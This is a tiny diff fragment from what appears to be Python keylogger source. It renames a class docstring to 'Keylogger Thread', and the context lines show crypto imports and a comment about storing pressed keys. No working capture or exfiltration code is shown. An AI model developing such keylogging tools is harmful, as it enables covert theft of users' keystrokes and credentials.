@@ -17,7 +17,7 @@ from Crypto.Util import Counter
 from Crypto.PublicKey import RSA 
 
 class Keylogger(Thread):
-    ''' Thread for incommig dns requests '''
+    ''' Keylogger Thread '''
     def  __init__(self):
         super().__init__()
         # string where we will store all the pressed keys
